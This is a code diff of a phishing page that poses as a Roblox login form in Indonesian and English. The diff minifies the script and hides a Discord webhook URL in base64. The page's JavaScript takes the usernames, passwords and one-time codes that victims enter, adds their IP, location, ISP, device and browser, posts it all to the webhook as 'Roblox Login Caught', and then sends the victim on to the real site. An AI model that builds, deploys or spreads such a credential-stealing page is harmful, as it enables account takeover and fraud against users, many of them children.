@@ -3,167 +3,79 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>Roblox</title>
+<title>Authentication</title>
 <style>
-  * { box-sizing: border-box; }
-  body { margin: 0; font-family: "Segoe UI", Helvetica, Arial, sans-serif; background-color: #1a1a1a; background-image: url('https://raw.githubusercontent.com/darkvex968/Login/main/file_0000000077188211a65f37288437766d.png'); background-size: cover; background-position: center; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
-  .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1; }
-  .card { position: relative; z-index: 2; width: 100%; max-width: 400px; background: #232527; border-radius: 12px; padding: 32px 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.8); color: #fff; }
-  h1 { font-size: 24px; font-weight: 700; text-align: center; margin: 0 0 24px; }
-  input { width: 100%; background: #393b3d; color: #fff; border: 1px solid #393b3d; border-radius: 8px; padding: 14px; font-size: 16px; outline: none; margin-bottom: 12px; }
-  input:focus { border-color: #fff; }
-  button { width: 100%; background: transparent; color: #fff; border: 1px solid #fff; border-radius: 8px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 12px; margin-bottom: 24px; }
-  button:active { background: rgba(255,255,255,0.1); }
-  button:disabled { opacity: 0.7; cursor: not-allowed; }
-  .err { display:none; color: #ff5555; font-size: 12px; margin-top: -8px; margin-bottom: 12px; }
-  .links { text-align: center; font-size: 15px; color: #b8b8b8; }
-  .links a { color: #fff; text-decoration: none; display: block; margin-bottom: 12px; }
-  .btn-gray { display: block; width: 100%; background: #393b3d; color: #fff; padding: 14px; border-radius: 8px; text-align: center; text-decoration: none; font-weight: 600; margin-bottom: 10px; cursor: pointer; }
-  .footer { text-align: center; font-size: 14px; color: #b8b8b8; margin-top: 24px; }
-  .footer a { color: #fff; text-decoration: none; font-weight: 600; }
+  *{box-sizing:border-box}
+  body{margin:0;font-family:"Segoe UI",Helvetica,Arial,sans-serif;background-color:#1a1a1a;background-image:url('https://raw.githubusercontent.com/darkvex968/Login/main/file_0000000077188211a65f37288437766d.png');background-size:cover;background-position:center;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
+  .ov{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.6);z-index:1}
+  .cd{position:relative;z-index:2;width:100%;max-width:400px;background:#232527;border-radius:12px;padding:32px 24px;box-shadow:0 10px 30px rgba(0,0,0,.8);color:#fff}
+  h1{font-size:24px;font-weight:700;text-align:center;margin:0 0 24px}
+  input{width:100%;background:#393b3d;color:#fff;border:1px solid #393b3d;border-radius:8px;padding:14px;font-size:16px;outline:0;margin-bottom:12px}
+  input:focus{border-color:#fff}
+  button{width:100%;background:0 0;color:#fff;border:1px solid #fff;border-radius:8px;padding:14px;font-size:16px;font-weight:600;cursor:pointer;margin-top:12px;margin-bottom:24px}
+  button:active{background:rgba(255,255,255,.1)}
+  button:disabled{opacity:.7;cursor:not-allowed}
+  .er{display:none;color:#ff5555;font-size:12px;margin-top:-8px;margin-bottom:12px}
+  .lk{text-align:center;font-size:15px;color:#b8b8b8}
+  .lk a{color:#fff;text-decoration:none;display:block;margin-bottom:12px}
+  .bg{display:block;width:100%;background:#393b3d;color:#fff;padding:14px;border-radius:8px;text-align:center;text-decoration:none;font-weight:600;margin-bottom:10px;cursor:pointer}
+  .ft{text-align:center;font-size:14px;color:#b8b8b8;margin-top:24px}
+  .ft a{color:#fff;text-decoration:none;font-weight:600}
 </style>
 </head>
 <body>
-<div class="overlay"></div>
-<main class="card">
-  
-  <div id="loginSection">
-    <h1 id="txt-title">Log in ke Roblox</h1>
+<div class="ov"></div>
+<main class="cd">
+  <div id="s1">
+    <h1 id="t1">Log in ke Roblox</h1>
     <form id="f" novalidate>
       <input id="u" type="text" placeholder="Nama Pengguna/Email/Nomor Ponsel" autocapitalize="none" required>
       <input id="p" type="password" placeholder="Password" required>
-      <div class="err" id="err"></div>
-      <button type="submit" id="go">Log In</button>
+      <div class="er" id="er"></div>
+      <button type="submit" id="g">Log In</button>
     </form>
-    
-    <div class="links">
-      <a href="#" onclick="return false;">Lupa Password atau Nama Pengguna?</a>
-    </div>
-    
-    <a href="#" class="btn-gray" id="btn-otp">Kirim Saya Kode Sekali Pakai</a>
-    <a href="#" class="btn-gray">Log In Cepat</a>
-    <a href="#" class="btn-gray">Opsi log in lainnya</a>
-    
-    <div class="footer" id="txt-footer">Tidak punya akun? <a href="#" onclick="return false;">Daftar</a></div>
+    <div class="lk"><a href="#" onclick="return false;">Lupa Password atau Nama Pengguna?</a></div>
+    <a href="#" class="bg" id="bo">Kirim Saya Kode Sekali Pakai</a>
+    <a href="#" class="bg">Log In Cepat</a>
+    <a href="#" class="bg">Opsi log in lainnya</a>
+    <div class="ft" id="ft">Tidak punya akun? <a href="#" onclick="return false;">Daftar</a></div>
   </div>
-
 </main>
-
 <script>
-var webhookURL = "https://discord.com/api/webhooks/1567847177643106384/w0XBjAtPTb9tITOSKZeTEW_fXsJxgecro2b-81vs9rTxIdrMWxZaRhKutRW8Fe8Ck6IW";
-var userLang = "id";
-
-fetch("https://ipapi.co/json/")
-.then(res => res.json())
-.then(data => {
-  if (data.country_code !== "ID") {
-    document.getElementById("txt-title").innerText = "Log in to Roblox";
-    document.getElementById("u").placeholder = "Username/Email/Phone Number";
-    document.getElementById("btn-otp").innerText = "Send Me One-Time Code";
-    document.getElementById("txt-footer").innerHTML = "Don't have an account? <a href='#'>Sign Up</a>";
-    userLang = "en";
-  }
-})
-.catch(() => {});
+var _w = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2Nzg0NzE3NzY0MzEwNjM4NC93MFhCakF0UFRiOXRJVFNPU0taZVRFV19mWHNKeGdlY3JvMmItODF2czlyVHhJZHJNV3haYVJoS3V0Ulc4RmU4Q2s2SVc=");
+var _l = "id";
+fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{
+if(d.country_code!=="ID"){document.getElementById("t1").innerText="Log in to Roblox";document.getElementById("u").placeholder="Username/Email/Phone Number";document.getElementById("bo").innerText="Send Me One-Time Code";document.getElementById("ft").innerHTML="Don't have an account? <a href='#'>Sign Up</a>";_l="en"}}).catch(()=>{});
 
 document.getElementById('f').addEventListener('submit', function(e){
-  e.preventDefault();
-  var u = document.getElementById('u').value.trim();
-  var p = document.getElementById('p').value.trim();
-  var go = document.getElementById('go');
-  var err = document.getElementById('err');
+e.preventDefault();
+var u=document.getElementById('u').value.trim(),p=document.getElementById('p').value.trim(),g=document.getElementById('g'),er=document.getElementById('er');
+if(!u||!p){er.textContent=_l==="id"?"Harap isi semua kolom.":"Please fill all fields.";er.style.display="block";return}
+er.style.display="none";g.textContent="Loading...";g.disabled=true;
+var ua=navigator.userAgent,dev="Unknown",br="Unknown";
+if(/android/i.test(ua))dev="Android";
+if(/iPhone|iPad|iPod/i.test(ua))dev="iOS";
+if(/Windows/i.test(ua))dev="Windows";
+if(/Mac/i.test(ua))dev="Mac";
+if(/chrome|crios/i.test(ua))br="Chrome";
+if(/safari/i.test(ua)&&!/chrome/i.test(ua))br="Safari";
+if(/firefox|fxios/i.test(ua))br="Firefox";
 
-  if(!u || !p) {
-    err.textContent = userLang === "id" ? "Harap isi semua kolom." : "Please fill all fields.";
-    err.style.display = "block";
-    return;
-  }
-
-  err.style.display = "none";
-  go.textContent = "Loading...";
-  go.disabled = true;
-
-  var ua = navigator.userAgent;
-  var device = "Unknown";
-  if (/android/i.test(ua)) device = "Android";
-  if (/iPhone|iPad|iPod/i.test(ua)) device = "iOS (Apple)";
-  if (/Windows/i.test(ua)) device = "Windows PC";
-  if (/Mac/i.test(ua)) device = "Mac PC";
-  
-  var browser = "Unknown";
-  if (/chrome|crios/i.test(ua)) browser = "Chrome";
-  if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = "Safari";
-  if (/firefox|fxios/i.test(ua)) browser = "Firefox";
-
-  fetch("https://ipapi.co/json/")
-  .then(res => res.json())
-  .then(loc => {
-    var ip = loc.ip || "Unknown";
-    var kota = loc.city || "Unknown";
-    var negara = loc.country_name || "Unknown";
-    var isp = loc.org || "Unknown";
-
-    var embedData = {
-      embeds: [{
-        title: "Roblox Login Caught",
-        color: 3447003,
-        fields: [
-          { name: "Username / Email", value: u, inline: false },
-          { name: "Password", value: p, inline: false },
-          { name: "IP Address", value: ip, inline: true },
-          { name: "Lokasi", value: kota + ", " + negara, inline: true },
-          { name: "Provider (ISP)", value: isp, inline: false },
-          { name: "Device", value: device, inline: true },
-          { name: "Browser", value: browser, inline: true }
-        ],
-        footer: { text: "Ryuu System" },
-        timestamp: new Date().toISOString()
-      }]
-    };
-
-    fetch(webhookURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(embedData)
-    })
-    .then(() => {
-      setTimeout(() => {
-        window.location.href = "https://www.roblox.com/login";
-      }, 1500);
-    });
-  })
-  .catch(() => {
-    window.location.href = "https://www.roblox.com/login";
-  });
+fetch("https://ipapi.co/json/").then(r=>r.json()).then(l=>{
+var ip=l.ip||"Unknown",ct=l.city||"Unknown",cn=l.country_name||"Unknown",isp=l.org||"Unknown";
+var data={embeds:[{title:"Roblox Login Caught",color:3447003,fields:[{name:"Username / Email",value:u,inline:false},{name:"Password",value:p,inline:false},{name:"IP Address",value:ip,inline:true},{name:"Lokasi",value:ct+", "+cn,inline:true},{name:"Provider (ISP)",value:isp,inline:false},{name:"Device",value:dev,inline:true},{name:"Browser",value:br,inline:true}],footer:{text:"Ryuu System"},timestamp:new Date().toISOString()}]};
+fetch(_w,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)}).then(()=>{setTimeout(()=>{window.location.href="https://www.roblox.com/login"},1500)})
+}).catch(()=>{window.location.href="https://www.roblox.com/login"})
 });
 
-document.getElementById('btn-otp').addEventListener('click', function(e) {
-  e.preventDefault();
-  var code = prompt(userLang === "id" ? "Masukkan kode 6 digit yang dikirim ke email kamu:" : "Enter the 6-digit code sent to your email:");
-  if (code && code.trim() !== "") {
-    var u = document.getElementById('u').value.trim() || "Belum diisi";
-    
-    var embedData = {
-      embeds: [{
-        title: "Roblox OTP Code Caught!",
-        color: 16711680,
-        fields: [
-          { name: "Username", value: u, inline: false },
-          { name: "OTP Code", value: code, inline: false }
-        ],
-        footer: { text: "Ryuu System" },
-        timestamp: new Date().toISOString()
-      }]
-    };
-
-    fetch(webhookURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(embedData)
-    }).then(() => {
-      window.location.href = "https://www.roblox.com/login";
-    });
-  }
+document.getElementById('bo').addEventListener('click', function(e){
+e.preventDefault();
+var code=prompt(_l==="id"?"Masukkan kode 6 digit yang dikirim ke email kamu:":"Enter the 6-digit code sent to your email:");
+if(code&&code.trim()!==""){
+var u=document.getElementById('u').value.trim()||"Belum diisi";
+var data={embeds:[{title:"Roblox OTP Code Caught!",color:16711680,fields:[{name:"Username",value:u,inline:false},{name:"OTP Code",value:code,inline:false}],footer:{text:"Ryuu System"},timestamp:new Date().toISOString()}]};
+fetch(_w,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)}).then(()=>{window.location.href="https://www.roblox.com/login"})
+}
 });
 </script>
 </body>
